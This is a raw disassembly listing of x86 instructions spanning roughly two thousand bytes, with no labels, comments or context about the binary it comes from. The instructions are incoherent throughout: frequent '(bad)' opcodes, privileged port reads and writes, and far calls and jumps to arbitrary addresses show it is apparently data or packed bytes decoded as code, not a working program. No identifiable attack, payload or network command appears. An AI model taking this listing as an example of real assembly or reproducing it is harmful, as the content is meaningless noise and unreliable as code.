  41905c:	addr16 sub eax,0x8df96d24
  419062:	push   esi
  419063:	pusha  
  419064:	arpl   WORD PTR [ecx],bx
  419066:	ins    DWORD PTR es:[edi],dx
  419067:	cmp    eax,DWORD PTR [edx]
  419069:	test   al,0x3d
  41906b:	mov    gs,WORD PTR [ebx+0x3b1742bb]
  419071:	fsubr  st(0),st
  419073:	push   ds
  419074:	pop    ecx
  419075:	mov    ch,0x9b
  419077:	add    DWORD PTR [esi-0xc],esi
  41907a:	out    dx,al
  41907b:	mov    al,0xcd
  41907d:	sub    al,0x85
  41907f:	sub    eax,0x72235c94
  419084:	xlat   BYTE PTR ds:[ebx]
  419085:	mov    cs,WORD PTR [edi-0x34]
  419088:	loope  0x4190d3
  41908a:	pop    ecx
  41908b:	xor    BYTE PTR [ecx+edi*8+0x8dd0d12],bh
  419092:	mov    al,ds:0xa67d00f8
  419097:	mov    WORD PTR es:[ebp+0x13],es
  41909b:	daa    
  41909c:	sub    al,0x89
  41909e:	push   ebx
  41909f:	dec    eax
  4190a0:	inc    ecx
  4190a1:	inc    ecx
  4190a2:	fbstp  TBYTE PTR [ecx-0x202059c8]
  4190a8:	lock rcl DWORD PTR ds:0xb7fc823d,0xf9
  4190b0:	pop    esi
  4190b1:	cmp    eax,0x9f0152be
  4190b6:	add    dh,bh
  4190b8:	stos   DWORD PTR es:[edi],eax
  4190b9:	fisubr DWORD PTR [ebx-0x7d1a74cd]
  4190bf:	or     eax,0x4bd69ecf
  4190c4:	cdq    
  4190c5:	(bad)  
  4190c6:	sbb    cl,bh
  4190c8:	iret   
  4190c9:	jl     0x419063
  4190cb:	retf   
  4190cc:	pop    ebp
  4190cd:	pop    eax
  4190ce:	fld    TBYTE PTR [ecx+0x23]
  4190d1:	jl     0x41909a
  4190d3:	(bad)  
  4190d4:	xor    dh,cl
  4190d6:	dec    ebx
  4190d7:	add    edx,edi
  4190d9:	js     0x419148
  4190db:	test   dh,dh
  4190dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190de:	and    eax,DWORD PTR [edi]
  4190e0:	in     eax,0x2e
  4190e2:	pop    edx
  4190e3:	arpl   WORD PTR [edx+0x54],ax
  4190e6:	add    eax,0x902b2ed7
  4190eb:	stos   BYTE PTR es:[edi],al
  4190ec:	jnp    0x41914f
  4190ee:	sub    dh,BYTE PTR [ecx]
  4190f0:	out    dx,eax
  4190f1:	dec    edx
  4190f2:	push   edi
  4190f3:	(bad)  
  4190f4:	scas   eax,DWORD PTR es:[edi]
  4190f5:	jae    0x419080
  4190f7:	(bad)  
  4190f8:	xchg   ecx,eax
  4190f9:	xchg   edi,eax
  4190fa:	jl     0x41908d
  4190fc:	jne    0x419127
  4190fe:	xchg   edx,eax
  4190ff:	mov    al,0x2c
  419101:	or     dl,BYTE PTR [eax+0x19]
  419104:	outs   dx,BYTE PTR ds:[esi]
  419105:	in     eax,dx
  419106:	scas   al,BYTE PTR es:[edi]
  419107:	mov    ecx,0x400080c9
  41910c:	sbb    eax,ebx
  41910e:	pop    ss
  41910f:	outs   dx,DWORD PTR ds:[esi]
  419110:	fisttp QWORD PTR [esi]
  419112:	aas    
  419113:	mov    esi,0xb0940e59
  419118:	mov    esi,0x42027488
  41911d:	ret    0xdff0
  419120:	push   0xad674ed0
  419125:	or     BYTE PTR [edi+ecx*2],ah
  419128:	(bad)  
  419129:	push   edx
  41912a:	xlat   BYTE PTR ds:[ebx]
  41912b:	mov    ecx,0x8d215780
  419130:	push   edx
  419131:	xor    edi,esp
  419133:	cmp    eax,0x19143d3e
  419138:	int3   
  419139:	pop    ebx
  41913a:	lahf   
  41913b:	sbb    eax,0x79003e58
  419140:	push   es
  419141:	or     cl,BYTE PTR [esi]
  419143:	inc    ebx
  419144:	xchg   ebx,eax
  419145:	xchg   esp,eax
  419146:	sahf   
  419147:	xchg   edx,eax
  419148:	lahf   
  419149:	hlt    
  41914a:	cmp    al,0xb0
  41914c:	and    DWORD PTR [eax],ebp
  41914e:	inc    ebp
  41914f:	push   ds
  419150:	(bad)  
  419151:	popf   
  419152:	add    eax,0xe01f5eda
  419157:	xchg   esi,ebp
  419159:	je     0x419174
  41915b:	std    
  41915c:	inc    edi
  41915d:	xchg   ebx,eax
  41915e:	mov    ebx,0x6633ec96
  419163:	adc    eax,0xa69e48df
  419168:	std    
  419169:	xchg   ebp,eax
  41916a:	ficom  DWORD PTR [ecx+eiz*1]
  41916d:	mov    dl,0x7c
  41916f:	jmp    0xd03420b0
  419174:	sub    eax,0x270793
  419179:	ja     0x4190fe
  41917b:	out    0x30,al
  41917d:	sbb    BYTE PTR [eax+0xd],al
  419180:	push   es
  419181:	out    dx,eax
  419182:	mov    DWORD PTR [ecx-0x2d],eax
  419185:	shl    DWORD PTR ds:0x70cc48c5,0x1f
  41918c:	call   0xb630:0x1cea2c98
  419193:	aad    0x2b
  419195:	mov    eax,ds:0xe3f3445e
  41919a:	jge    0x419152
  41919c:	jns    0x419179
  41919e:	popa   
  41919f:	mov    bh,0xea
  4191a1:	sub    al,0x4b
  4191a3:	cmp    cl,dl
  4191a5:	and    ah,dl
  4191a7:	jb     0x4191f1
  4191a9:	mov    eax,0x894dcda5
  4191ae:	test   esi,ebx
  4191b0:	add    DWORD PTR [esi],ebp
  4191b2:	sbb    al,0x47
  4191b4:	in     eax,dx
  4191b5:	push   eax
  4191b6:	mov    ebx,0xdcce0072
  4191bb:	mov    ds:0x23fbf063,eax
  4191c0:	push   cs
  4191c1:	aaa    
  4191c2:	jmp    0xf54e43ac
  4191c7:	cdq    
  4191c8:	xchg   edx,eax
  4191c9:	cmc    
  4191ca:	adc    eax,ecx
  4191cc:	or     BYTE PTR [edi],ch
  4191ce:	in     al,0x8e
  4191d0:	jae    0x419226
  4191d2:	dec    esi
  4191d3:	mov    cl,0x14
  4191d5:	stos   BYTE PTR es:[edi],al
  4191d6:	cmp    al,0x28
  4191d8:	addr16 inc esp
  4191da:	mov    bh,0xb9
  4191dc:	dec    esp
  4191dd:	(bad)  
  4191de:	jg     0x41916e
  4191e0:	add    ebp,DWORD PTR [edx-0x5827af6d]
  4191e6:	jmp    0xa427c735
  4191eb:	push   0xe4622ded
  4191f0:	pop    eax
  4191f1:	add    ebp,eax
  4191f3:	xor    al,0x51
  4191f5:	repz xor ebx,edi
  4191f8:	not    DWORD PTR [edi-0x54]
  4191fb:	cwde   
  4191fc:	test   DWORD PTR [eax-0x6b982cb2],edx
  419202:	jne    0x419238
  419204:	mov    al,ds:0x5d66bdac
  419209:	jnp    0x4191eb
  41920b:	or     eax,0x2a9b6266
  419210:	xchg   esi,eax
  419211:	dec    esp
  419212:	icebp  
  419213:	inc    ecx
  419214:	sbb    DWORD PTR [esi+edi*1+0x5e5681fd],esi
  41921b:	jge    0x419288
  41921d:	cmp    cl,ch
  41921f:	add    bh,BYTE PTR [ebx-0x6e]
  419222:	stc    
  419223:	out    0x30,eax
  419225:	gs and bh,dl
  419228:	cmp    edx,DWORD PTR [edi]
  41922a:	xchg   edi,eax
  41922b:	addr16 das 
  41922d:	pop    edx
  41922e:	add    DWORD PTR ds:0xe47bfa9c,ebx
  419234:	mov    ds:0x9a0a5bb2,eax
  419239:	js     0x419237
  41923b:	cmp    DWORD PTR [edi-0x1c],edx
  41923e:	mov    bh,0xa2
  419240:	into   
  419241:	sahf   
  419242:	xor    BYTE PTR [edx-0x46],al
  419245:	(bad)  
  419247:	mov    bl,bl
  419249:	and    bl,BYTE PTR [esp+edi*1-0x1b595e66]
  419250:	leave  
  419251:	sbb    DWORD PTR [eax+0x3c],esp
  419254:	add    BYTE PTR [ebx+0x15c61622],al
  41925a:	test   ebp,ecx
  41925c:	ins    BYTE PTR es:[edi],dx
  41925d:	dec    esi
  41925e:	test   BYTE PTR [edx+0x43],ah
  419261:	fistp  DWORD PTR [ecx]
  419263:	lods   al,BYTE PTR ds:[esi]
  419264:	scas   eax,DWORD PTR es:[edi]
  419265:	push   0xffffffcc
  419267:	inc    esp
  419268:	jecxz  0x41927f
  41926a:	jmp    0xac70:0x74f2602
  419271:	xor    al,0xb5
  419273:	repnz out 0xe9,eax
  419276:	push   edx
  419277:	es dec ebx
  419279:	shr    ebx,1
  41927b:	mov    edx,0xac5c5d0f
  419280:	cli    
  419281:	lds    ebx,FWORD PTR [edi-0x4b21bec5]
  419287:	lods   eax,DWORD PTR ds:[esi]
  419288:	cmp    cl,BYTE PTR [ebp*1-0x129f662f]
  41928f:	dec    edx
  419290:	aaa    
  419291:	scas   al,BYTE PTR es:[edi]
  419292:	loope  0x419254
  419294:	fisttp DWORD PTR [ecx]
  419296:	mov    BYTE PTR [eax],ch
  419298:	icebp  
  419299:	fdiv   DWORD PTR [ecx+0x49301cf]
  41929f:	ja     0x4192d9
  4192a1:	mov    ch,0xc7
  4192a3:	ds xor eax,0xceb2dbfd
  4192a9:	ja     0x419287
  4192ab:	fistp  DWORD PTR [ebp-0x42c516f6]
  4192b1:	stc    
  4192b2:	mov    ah,0xe5
  4192b4:	mov    fs,WORD PTR [edx+eiz*8+0x5df53056]
  4192bb:	sub    ebx,edi
  4192bd:	push   ds
  4192be:	(bad)  
  4192bf:	adc    al,0xd5
  4192c1:	push   esi
  4192c2:	sbb    eax,DWORD PTR [ebx+0x381220b9]
  4192c8:	mov    ecx,0xef4ff953
  4192cd:	cs nop
  4192cf:	sbb    dl,0x79
  4192d2:	sbb    al,0x69
  4192d4:	ret    
  4192d5:	out    dx,al
  4192d6:	sahf   
  4192d7:	lahf   
  4192d8:	ins    BYTE PTR es:[edi],dx
  4192d9:	cmp    eax,0xf8cdfadb
  4192de:	inc    ebp
  4192df:	xor    al,0xf1
  4192e1:	loop   0x419293
  4192e3:	inc    eax
  4192e4:	in     eax,dx
  4192e5:	mov    esp,0x1f39a1a
  4192ea:	jle    0x41926e
  4192ec:	add    DWORD PTR [eax],0x0
  4192f2:	inc    ebp
  4192f3:	push   cs
  4192f4:	retf   0xcb6c
  4192f7:	in     al,dx
  4192f8:	out    0x2f,eax
  4192fa:	dec    ecx
  4192fb:	add    eax,0xb02f5d81
  419300:	(bad)  
  419301:	xchg   esp,eax
  419302:	fisttp QWORD PTR [edi]
  419304:	add    DWORD PTR [eax],eax
  419306:	repz add al,0x0
  419309:	add    dh,al
  41930b:	stc    
  41930c:	ret    0xaee1
  41930f:	and    DWORD PTR [eax-0x220c72bc],0xffffffd5
  419316:	jo     0x41933a
  419318:	out    0xde,eax
  41931a:	ret    
  41931b:	imul   edx,DWORD PTR [ebp-0x51967b49],0x62058f65
  419325:	adc    al,0x3e
  419327:	outs   dx,DWORD PTR ds:[esi]
  419328:	add    BYTE PTR [ebx+0xf9c1127],ah
  41932e:	out    dx,eax
  41932f:	mov    ah,0x4f
  419331:	je     0x4192e2
  419333:	cmp    al,BYTE PTR [eax+0x4]
  419336:	iret   
  419337:	pop    ebp
  419338:	gs sbb eax,0x81e4e6f1
  41933e:	sbb    dh,BYTE PTR [edi+0x103ef7b5]
  419344:	pop    edi
  419345:	xchg   esp,eax
  419346:	out    0xed,al
  419348:	in     al,0x23
  41934a:	pop    ebp
  41934b:	js     0x419334
  41934d:	sahf   
  41934e:	loopne 0x4192f7
  419350:	add    al,0x3f
  419352:	out    0x33,eax
  419354:	inc    eax
  419355:	stc    
  419356:	cmp    dl,BYTE PTR [esi-0x489d0f04]
  41935c:	mov    dl,0x32
  41935e:	icebp  
  41935f:	jle    0x419360
  419361:	out    0x63,al
  419363:	cmp    ch,BYTE PTR [ecx-0x5a99fd3]
  419369:	xor    eax,0x726d94
  41936e:	cli    
  41936f:	and    BYTE PTR cs:[esi-0x10],0x6f
  419374:	jb     0x419370
  419376:	sub    ebx,DWORD PTR [esi+0x7a]
  419379:	test   DWORD PTR [ebp+0x1f3d9452],esp
  41937f:	das    
  419380:	jne    0x419367
  419382:	and    al,0x20
  419384:	test   DWORD PTR [ebp+0x9],esp
  419387:	push   0xffffffad
  419389:	dec    ebp
  41938a:	mov    edx,0x80499082
  41938f:	popf   
  419390:	(bad)  
  419391:	mov    bl,BYTE PTR [ecx+0x71]
  419394:	int    0x85
  419396:	(bad)  
  419397:	jecxz  0x419403
  419399:	and    DWORD PTR [ecx+0x5c2bac0d],0xfa4dec83
  4193a3:	cmp    eax,0x1b
  4193a6:	fs inc ecx
  4193a8:	add    DWORD PTR [esi+0x56],edi
  4193ab:	loop   0x419356
  4193ad:	jge    0x419375
  4193af:	lods   eax,DWORD PTR ds:[esi]
  4193b0:	mov    ebx,0x3663f79d
  4193b5:	mov    DWORD PTR [ebp+0x39d7b15b],esp
  4193bb:	ret    
  4193bc:	or     DWORD PTR [eax-0x32072936],ecx
  4193c2:	inc    eax
  4193c3:	cmp    eax,0x567f329b
  4193c8:	xor    ebx,DWORD PTR [eax-0x29]
  4193cb:	in     al,0x63
  4193cd:	pop    es
  4193ce:	pop    edi
  4193cf:	repnz pop es
  4193d1:	es inc esp
  4193d3:	cld    
  4193d4:	in     al,dx
  4193d5:	add    edi,DWORD PTR [eax-0x28]
  4193d8:	in     eax,0xcf
  4193da:	int    0xd6
  4193dc:	or     al,0x8e
  4193de:	fiadd  DWORD PTR [ebp-0x6]
  4193e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193e2:	cmc    
  4193e3:	sbb    ch,bh
  4193e5:	push   0xb9f37539
  4193ea:	adc    esp,DWORD PTR [ebp+0x6e322932]
  4193f0:	gs lahf 
  4193f2:	mov    bh,BYTE PTR [ecx]
  4193f4:	pop    esp
  4193f5:	shr    DWORD PTR [edi-0x645f01d4],0xba
  4193fc:	arpl   si,sp
  4193fe:	cli    
  4193ff:	jmp    0x1371:0x13b319cd
  419406:	dec    eax
  419407:	ins    BYTE PTR es:[edi],dx
  419408:	test   DWORD PTR [edx+0x2442f6e0],esp
  41940e:	sub    cl,dl
  419410:	lods   eax,DWORD PTR ds:[esi]
  419411:	nop
  419412:	cmp    al,BYTE PTR [edi+0x616d650]
  419418:	lods   al,BYTE PTR ds:[esi]
  419419:	shl    BYTE PTR [edx],1
  41941b:	inc    ebp
  41941c:	and    DWORD PTR [esi],edi
  41941e:	cwde   
  41941f:	imul   ecx,DWORD PTR [ebp+eiz*4-0x86f269b],0xfb02b694
  41942a:	into   
  41942b:	fsubr  QWORD PTR [ebx+ebx*4]
  41942e:	jg     0x41942f
  419430:	mov    al,0xe7
  419432:	fsub   DWORD PTR [ebx]
  419434:	inc    edx
  419435:	lods   eax,DWORD PTR ds:[esi]
  419436:	xchg   dl,ah
  419438:	and    eax,0xc607d423
  41943d:	mov    DWORD PTR [esi+0x12],eax
  419440:	add    ch,BYTE PTR [ecx]
  419442:	sub    ah,BYTE PTR [di+0xeed]
  419447:	xchg   esp,eax
  419448:	add    al,dh
  41944a:	jl     0x419418
  41944c:	add    edx,esp
  41944e:	popa   
  41944f:	inc    esp
  419450:	sar    BYTE PTR [esp+eax*2-0x6b83a0f],0x52
  419458:	cmp    DWORD PTR [edx-0x42c5de31],eax
  41945e:	cmp    ch,dh
  419460:	iret   
  419461:	nop
  419462:	aam    0xc9
  419464:	mov    ?,WORD PTR [ebx+0x2f9ffa4d]
  41946a:	push   esp
  41946b:	and    al,0xa9
  41946d:	xchg   ebx,eax
  41946e:	mov    al,0xb0
  419470:	inc    ecx
  419471:	rcl    BYTE PTR cs:[edi+0x53c64a4f],1
  419478:	fsubr  DWORD PTR [esi+0x739fab3f]
  41947e:	mov    ds:0x46fd7284,al
  419483:	push   eax
  419484:	mov    al,ds:0xc8d44ddd
  419489:	pop    ebp
  41948a:	push   ds
  41948b:	dec    esp
  41948c:	loopne 0x41941a
  41948e:	inc    esi
  41948f:	jo     0x419479
  419491:	ret    0x51b6
  419494:	mov    dl,0x7e
  419496:	xchg   ecx,eax
  419497:	sbb    dh,bh
  419499:	int    0x2c
  41949b:	scas   eax,DWORD PTR es:[edi]
  41949c:	xor    bh,dh
  41949e:	(bad)  
  41949f:	popf   
  4194a0:	clc    
  4194a1:	sti    
  4194a2:	mov    ds:0x9c92c235,al
  4194a7:	loopne 0x41946c
  4194a9:	dec    eax
  4194aa:	or     eax,0x2ddc6a5b
  4194af:	mov    dh,0xab
  4194b1:	xchg   ebx,eax
  4194b2:	jl     0x419498
  4194b4:	test   DWORD PTR [ecx-0x3c],edi
  4194b7:	xchg   ecx,eax
  4194b8:	or     cl,BYTE PTR ds:0x3a864a35
  4194be:	mov    dl,0xcc
  4194c0:	push   ds
  4194c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194c2:	into   
  4194c3:	mov    ebp,0xc931022c
  4194c8:	mov    ecx,0xc89502ae
  4194cd:	dec    ecx
  4194ce:	sbb    BYTE PTR [ecx],cl
  4194d0:	pushf  
  4194d1:	std    
  4194d2:	pop    ecx
  4194d3:	mov    ds:0xf6a0cd7d,al
  4194d8:	mov    bl,0x12
  4194da:	jge    0x419539
  4194dc:	call   DWORD PTR [eax+0x7]
  4194df:	je     0x4194af
  4194e1:	mov    ah,0x3e
  4194e3:	xchg   esp,eax
  4194e4:	cmp    esp,ebp
  4194e6:	out    0x96,eax
  4194e8:	or     al,0xe3
  4194ea:	pushf  
  4194eb:	dec    eax
  4194ec:	out    dx,al
  4194ed:	sahf   
  4194ee:	mov    eax,0x9f2ccb5f
  4194f3:	sub    DWORD PTR [edi-0x5],edx
  4194f6:	pop    edx
  4194f7:	out    dx,eax
  4194f8:	or     ecx,DWORD PTR [edx]
  4194fa:	test   DWORD PTR [ecx-0x25],edx
  4194fd:	xor    edx,DWORD PTR [esi]
  4194ff:	ds into 
  419501:	leave  
  419502:	ficomp WORD PTR [eax]
  419504:	push   es
  419505:	push   0xcdef4d43
  41950a:	push   ds
  41950b:	push   ss
  41950c:	and    ecx,DWORD PTR [edx]
  41950e:	or     DWORD PTR [edx],ebx
  419510:	mov    esi,0x50717a87
  419515:	aas    
  419516:	(bad)  
  419518:	repz (bad) 
  41951a:	int3   
  41951b:	mov    DWORD PTR [ecx-0x3c11940e],edi
  419521:	adc    DWORD PTR [esp+esi*1-0x57],0xffffff8b
  419526:	pop    es
  419527:	sbb    eax,0xb86e75f8
  41952c:	mov    WORD PTR [ebp-0x4a],ds
  41952f:	adc    BYTE PTR [ebx],cl
  419531:	out    0x64,eax
  419533:	sbb    esp,DWORD PTR [edi]
  419535:	outs   dx,BYTE PTR ds:[esi]
  419536:	push   cs
  419537:	jno    0x41956d
  419539:	ds sub edx,0xc97dbb1f
  419540:	mov    bl,0xcd
  419542:	into   
  419543:	int3   
  419544:	inc    ebx
  419545:	jns    0x419509
  419547:	stos   BYTE PTR es:[edi],al
  419548:	scas   al,BYTE PTR es:[edi]
  419549:	fwait
  41954a:	pop    esp
  41954b:	(bad)  
  41954c:	xlat   BYTE PTR ds:[ebx]
  41954d:	cmc    
  41954e:	pop    edx
  41954f:	mov    dl,BYTE PTR [edi]
  419551:	imul   edi,DWORD PTR [ebx-0x3a],0xe
  419555:	jp     0x419582
  419557:	js     0x419565
  419559:	adc    ebp,DWORD PTR [esi+0x4ef03b34]
  41955f:	lods   al,BYTE PTR ss:[esi]
  419561:	fs test ecx,edx
  419564:	add    eax,0xfae7a4bb
  419569:	arpl   WORD PTR [ebp-0x2d],ax
  41956c:	push   ebx
  41956d:	cmc    
  41956e:	mov    ch,0x17
  419570:	test   al,0x57
  419572:	mov    edx,0xc52616c2
  419577:	icebp  
  419578:	das    
  419579:	or     DWORD PTR [ebp-0x5f54a0ad],ecx
  41957f:	out    0x4f,eax
  419581:	lods   al,BYTE PTR ds:[esi]
  419582:	icebp  
  419583:	dec    esi
  419584:	ret    
  419585:	pusha  
  419586:	adc    al,0x5c
  419588:	addr16 arpl ax,bp
  41958b:	add    ch,BYTE PTR [ecx+0x1e]
  41958e:	mov    dl,BYTE PTR ss:[esi+0x588c0c37]
  419595:	mov    esp,0x532f9688
  41959a:	stos   DWORD PTR es:[edi],eax
  41959b:	fldenv [edx-0x77]
  41959e:	mov    dl,0x32
  4195a0:	ret    0xc33a
  4195a3:	dec    eax
  4195a4:	out    0xa7,al
  4195a6:	into   
  4195a7:	test   al,0x67
  4195a9:	fldcw  WORD PTR [edx-0x1c]
  4195ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195ad:	pop    esp
  4195ae:	in     eax,dx
  4195af:	xchg   BYTE PTR [edi-0x64f6c6ce],al
  4195b5:	pop    es
  4195b6:	jns    0x41960b
  4195b8:	ds pushf 
  4195ba:	pop    esp
  4195bb:	mov    ebp,DWORD PTR [esi]
  4195bd:	add    ecx,DWORD PTR [edi+0x4012b70c]
  4195c3:	add    dh,BYTE PTR [ecx]
  4195c5:	mul    BYTE PTR [edi]
  4195c7:	outs   dx,BYTE PTR ds:[esi]
  4195c8:	push   ebp
  4195c9:	inc    eax
  4195ca:	mov    ch,0xea
  4195cc:	inc    ecx
  4195cd:	fyl2xp1 
  4195cf:	or     edi,0xffffff82
  4195d2:	icebp  
  4195d3:	adc    edx,DWORD PTR [ecx-0x6deedfbe]
  4195d9:	clc    
  4195da:	repz retf 0x12e0
  4195de:	mov    dl,0xa9
  4195e0:	sub    al,0x40
  4195e2:	fcom   DWORD PTR [esi+0x5a]
  4195e5:	sub    eax,0xfec232c7
  4195ea:	iret   
  4195eb:	dec    ebx
  4195ec:	sub    DWORD PTR [ecx],ebx
  4195ee:	mov    BYTE PTR [ecx+0x7b],ch
  4195f1:	push   ecx
  4195f2:	cmp    al,bl
  4195f4:	enter  0xb8d5,0x3e
  4195f8:	add    ch,BYTE PTR [ebp+0x4e]
  4195fb:	cmp    DWORD PTR [ebp+0x134df079],edi
  419601:	and    eax,0x976d00e4
  419606:	xchg   ebp,eax
  419607:	xchg   DWORD PTR [ebx-0x3de38c8f],ecx
  41960d:	call   0xa180:0x9cea5f
  419614:	and    bh,dl
  419616:	mov    fs,WORD PTR [eax]
  419618:	das    
  419619:	sbb    al,0xd7
  41961b:	dec    esi
  41961c:	and    BYTE PTR [ebp+edx*4-0x2a],dl
  419620:	pop    ss
  419621:	shl    cl,0x37
  419624:	xchg   esi,eax
  419625:	xchg   ebp,eax
  419626:	mov    al,ds:0x34ff0ffc
  41962b:	sbb    dh,al
  41962d:	jnp    0x4195ff
  41962f:	rcr    DWORD PTR [edx+ebp*4],0xea
  419633:	inc    ebx
  419634:	gs fwait
  419636:	pop    edi
  419637:	push   esi
  419638:	mov    eax,ds:0x9c99cabc
  41963d:	inc    edi
  41963e:	cmp    DWORD PTR [ecx],0xffffffaa
  419641:	cld    
  419642:	jns    0x419645
  419644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419645:	cmp    BYTE PTR [edx-0x57],0x74
  419649:	and    BYTE PTR [edx+0x680c04ca],ah
  41964f:	scas   eax,DWORD PTR es:[edi]
  419650:	mov    bl,0x54
  419652:	sar    DWORD PTR [edx-0x5de3d8ad],0x72
  419659:	dec    ecx
  41965a:	sub    WORD PTR ds:0x82a4f506,sp
  419661:	add    ah,ah
  419663:	sahf   
  419664:	sbb    DWORD PTR [ecx+ebp*1],ebp
  419667:	inc    ecx
  419668:	cli    
  419669:	mov    eax,0x410acd4e
  41966e:	aad    0xfe
  419670:	aam    0x33
  419672:	sub    eax,0xdc8b8507
  419677:	ret    
  419678:	loope  0x41964c
  41967a:	cmp    DWORD PTR cs:[edx+0x12],0x27
  41967f:	es inc edx
  419681:	fcomi  st,st(5)
  419683:	repnz adc dh,bh
  419686:	in     eax,dx
  419687:	xor    al,0x56
  419689:	sbb    al,0xf3
  41968b:	test   BYTE PTR ds:0x2efbefd8,bl
  419691:	xor    al,BYTE PTR [esi-0x7a]
  419694:	into   
  419695:	xchg   edx,eax
  419696:	jne    0x4196f9
  419698:	push   edx
  419699:	stos   BYTE PTR es:[edi],al
  41969a:	pushf  
  41969b:	dec    ecx
  41969c:	mov    dl,0xcb
  41969e:	cwde   
  41969f:	arpl   WORD PTR [esi],di
  4196a1:	mov    ecx,0x668789f5
  4196a6:	in     eax,0x9d
  4196a8:	loopne 0x419661
  4196aa:	(bad)  
  4196ad:	xchg   edx,eax
  4196ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196af:	add    DWORD PTR [edx+eax*4+0x7],ebp
  4196b3:	fadd   DWORD PTR [eax-0x37dd13bd]
  4196b9:	rcl    ch,1
  4196bb:	mov    ds:0x81e0736c,al
  4196c0:	ins    DWORD PTR es:[edi],dx
  4196c1:	or     dh,BYTE PTR [eax-0x6d]
  4196c4:	inc    ebp
  4196c5:	(bad)  
  4196c6:	sar    DWORD PTR [ecx-0x4798009c],cl
  4196cc:	cmp    bh,BYTE PTR [esi]
  4196ce:	loop   0x4196c4
  4196d0:	ja     0x4196ce
  4196d2:	sub    eax,0xa0591986
  4196d7:	fs mul bl
  4196da:	in     eax,dx
  4196db:	scas   eax,DWORD PTR es:[edi]
  4196dc:	mov    esi,0xc2dc7cca
  4196e1:	bound  edx,QWORD PTR es:[esi]
  4196e4:	iret   
  4196e5:	retf   
  4196e6:	pop    DWORD PTR [edx-0x2d136c21]
  4196ec:	into   
  4196ed:	fs jns 0x419767
  4196f0:	sub    al,0x73
  4196f2:	dec    esp
  4196f3:	in     eax,0x6d
  4196f5:	lock mov WORD PTR [esi+0x6e1839b4],?
  4196fc:	jne    0x419761
  4196fe:	std    
  4196ff:	mov    edx,DWORD PTR [ebx-0x70]
  419702:	add    bl,ah
  419704:	gs popa 
  419706:	xor    dh,BYTE PTR [esi-0x6479500d]
  41970c:	out    dx,al
  41970d:	add    BYTE PTR [ebx+0x56],bh
  419710:	daa    
  419711:	jge    0x419719
  419713:	dec    edi
  419714:	jne    0x419702
  419716:	sub    al,0x66
  419718:	cmp    BYTE PTR [ecx-0x6274cabb],al
  41971e:	rol    DWORD PTR cs:[esi],1
  419721:	jl     0x419755
  419723:	and    esi,DWORD PTR [esi]
  419725:	retf   0xbd67
  419728:	sbb    al,0x51
  41972a:	mov    bh,0x84
  41972c:	inc    eax
  41972d:	sbb    DWORD PTR [eax],eax
  41972f:	push   0xa996c618
  419734:	stos   BYTE PTR es:[edi],al
  419735:	int    0x2e
  419737:	mov    edx,DWORD PTR [ebx+0x6c622778]
  41973d:	mov    edx,gs
  41973f:	ror    DWORD PTR [ebx+0x7788f530],0xd8
  419746:	cmp    DWORD PTR [bx+si-0x5681],ebp
  41974b:	lods   eax,DWORD PTR ds:[esi]
  41974c:	hlt    
  41974d:	push   ss
  41974e:	xchg   cl,al
  419750:	fmul   DWORD PTR [edx+0x12a44d74]
  419756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419757:	adc    eax,DWORD PTR [ebx-0x7c]
  41975a:	xor    BYTE PTR [ebx],0x70
  41975d:	(bad)  
  41975e:	inc    edi
  41975f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419760:	and    BYTE PTR [ebx],dh
  419762:	dec    esi
  419763:	inc    edx
  419764:	iret   
  419765:	(bad)  
  419766:	and    al,al
  419768:	mov    dl,0xec
  41976a:	or     ah,dh
  41976c:	mov    ecx,0xdfd4fad
  419771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419772:	ret    
  419773:	mov    cl,0xd7
  419775:	push   ecx
  419776:	in     eax,dx
  419777:	shr    bl,1
  419779:	test   al,0xcf
  41977b:	cmp    DWORD PTR [ecx+ebx*8],ecx
  41977e:	icebp  
  41977f:	push   ebx
  419780:	pop    edi
  419781:	push   esi
  419782:	cmp    BYTE PTR [eiz*1-0x736f629e],dl
  419789:	push   ss
  41978a:	dec    edi
  41978b:	cmp    al,0xf4
  41978d:	cmovnp ebx,DWORD PTR [esi]
  419790:	pop    ss
  419791:	shr    ecx,0x38
  419794:	add    eax,0xaa280afb
  419799:	adc    eax,0x99f8f7d7
  41979e:	cmp    al,0x3f
  4197a0:	inc    esp
  4197a1:	inc    esi
  4197a2:	in     al,dx
  4197a3:	push   ebx
  4197a4:	cmp    DWORD PTR [esi-0x1868342e],ebp
  4197aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197ab:	jns    0x4197c3
  4197ad:	mov    ecx,0xd693b9e9
  4197b2:	xor    edi,DWORD PTR [esi+0x4c]
  4197b5:	fs dec eax
  4197b7:	cld    
  4197b8:	shl    BYTE PTR [edx-0x3f36a263],0x87
  4197bf:	sub    cl,BYTE PTR [ecx+0x14]
  4197c2:	jl     0x419755
  4197c4:	add    dl,0xe4
  4197c7:	inc    esi
  4197c8:	inc    eax
  4197c9:	mov    ecx,0xbd790d76
  4197ce:	call   0x4ba5:0x73a22753
  4197d5:	fbld   TBYTE PTR [esi]
  4197d7:	cmc    
  4197d8:	inc    edi
  4197d9:	pop    edx
  4197da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197db:	and    DWORD PTR [esi+0x72],esi
  4197de:	jnp    0x4197ea
  4197e0:	xchg   edi,eax
  4197e1:	fistp  DWORD PTR [eax+esi*8]
  4197e4:	xchg   BYTE PTR [eax],ah
  4197e6:	shl    DWORD PTR [edi],1
  4197e8:	or     bh,BYTE PTR [ebp-0x3a]
  4197eb:	xor    DWORD PTR [edx+0xa7e4feb],eax
  4197f1:	test   DWORD PTR [edx-0x46],0x81a2d028
  4197f8:	sbb    BYTE PTR ds:0xf7bcd5,ch
  4197fe:	add    BYTE PTR [eax],al
  419800:	add    BYTE PTR [eax],al
  419802:	adc    al,0xe9
  419804:	je     0x41982a
  419806:	std    
  419807:	mov    ebp,0x2ac7f954
  41980c:	(bad)  
  41980d:	ror    al,1
  41980f:	dec    eax
  419810:	fnop   
  419812:	rcl    BYTE PTR [ecx+eax*1],1
  419815:	add    bl,dh
  419817:	add    al,0x0
